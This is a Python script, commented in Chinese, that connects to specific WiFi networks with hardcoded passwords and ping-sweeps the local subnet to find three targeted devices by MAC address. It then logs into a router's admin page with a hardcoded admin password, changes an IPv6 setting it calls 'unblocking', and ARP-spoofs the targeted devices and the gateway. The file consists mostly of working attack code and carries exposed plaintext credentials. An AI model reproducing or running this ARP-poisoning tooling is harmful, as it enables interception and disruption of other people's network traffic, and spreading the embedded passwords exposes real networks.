import pywifi
import time
from pywifi import const
from scapy.all import *


###########################
def connect_wifi():
    wifi = pywifi.PyWiFi()  # 创建一个wifi对象
    ifaces = wifi.interfaces()[1]  # 取第一个无限网卡
    print(ifaces.name())  # 输出无线网卡名称
    ifaces.disconnect()  # 断开网卡连接
    time.sleep(3)  # 缓冲3秒
    profile = pywifi.Profile()  # 配置文件
    profile.ssid = "TELUSWiFi0421"  # wifi名称
    profile.auth = const.AUTH_ALG_OPEN  # 需要密码
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
    profile.key = 'eQPm4QtXrx'  #wifi密码
    ifaces.remove_all_network_profiles()  # 删除其他配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
    ifaces.connect(tmp_profile)  # 连接
    time.sleep(5)
    if ifaces.status() != const.IFACE_CONNECTED:
        profile = pywifi.Profile()  # 配置文件
        profile.ssid = "TELUS1773"  # wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 需要密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = '9nnx6aq94j'  #wifi密码
        ifaces.remove_all_network_profiles()  # 删除其他配置文件
        tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
        ifaces.connect(tmp_profile)  # 连接
        if ifaces.status() != const.IFACE_CONNECTED:
            connect_wifi()
        else:
            return
    else:
        return
###########################
dics=[]
import _thread
import os
def pings(ip):
	os.system("ping -c 5 "+str(ip))
'''srp(IP(dst='192.168.1.1/24')/ICMP(),timeout=5)'''
def get_all_mac(ip_ad):
	mac=getmacbyip(ip_ad)
	print(mac,"->",ip_ad)
	if mac== "cc:c0:79:52:7b:52" or mac=="20:c9:d0:7a:a4:b5" or mac=="48:2c:a0:ed:8b:b8":
		dics.append([mac,ip_ad])
		print(dics)
ip_base="192.168.1."
for i in range(1,256):
	_thread.start_new_thread( pings,(ip_base+str(i),))
'''for i in range(1,256):
	get_all_mac(ip_base+str(i))
print(dics)'''
###########################
import time
import requests
import re
import os
url = "http://192.168.1.254"
url_home = "http://192.168.1.254/index.html"
loginurl = url + "/login.cgi"
logouturl = url + "/logout.cgi"
session = requests.Session()


def get_sessionKey():
    response = session.get(url_home)
    index_html = response.text
    sessionKey = re.findall("var sessionKey = '(.*?)';", index_html)[0]
    return sessionKey


def login():
    print("[*]Login...!")
    sessionKey = get_sessionKey()
    """Change to your password there"""
    login_data = {
        "inputUserName": "admin",
        "inputPassword": "yb7gk7xn",
        "sessionKey": sessionKey
    }
    response = session.post(loginurl, data=login_data)
    cookie = session.cookies.get_dict()
    if "err" in response.text:
        print("[*]Wrong Username/Password...!")
        os._exit(0)
    else:
        print("[*]Login success!")
    print("[*]status_code:", response.status_code)


def db():
    print("[*]Unblocking...!")
    db_url = "http://192.168.1.254/ipv6_wansetting.cgi"
    sessionKey = get_sessionKey()
    db_data = {"ipv6_enable": "0", "sessionKey": sessionKey}
    response = session.post(db_url, data=db_data)
    if "After new settings are applied" in response.text:
        print("[*]Unblcok Success!")
    else:
        print("[*]Unblock Failed...!")
    print("[*]status_code:", response.status_code)


###########################
def arp_spoofs(dics):
    your_mac = getmacbyip("127.0.0.1")
    gateway_ip = "192.168.1.254"
    gateway_mac = getmacbyip("192.168.1.254")
    for i in range(50):
        for i in dics:
            target_ip = i[1]
            target_mac = i[0]
            poison_target = ARP()
            poison_target.op = 2
            poison_target.psrc = gateway_ip
            poison_target.pdst = target_ip
            poison_target.hwsrc = your_mac
            poison_target.hwdst = target_mac
            poison_gateway = ARP()
            poison_gateway.op = 2
            poison_gateway.psrc = target_ip
            poison_gateway.pdst = gateway_ip
            poison_gateway.hwsrc = your_mac
            poison_gateway.hwdst = gateway_mac
            send(poison_gateway)
            send(poison_target)
###########################
'''if __name__ == "__main__":
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[1]
    dics=get_all_mac()
    print(dics)
    while 1:
        if ifaces.status() == const.IFACE_CONNECTED:
          arp_spoofs(dics) 
        else:
            connect_wifi()
            dics=get_all_mac()
            sessionKey=login()
            db()'''
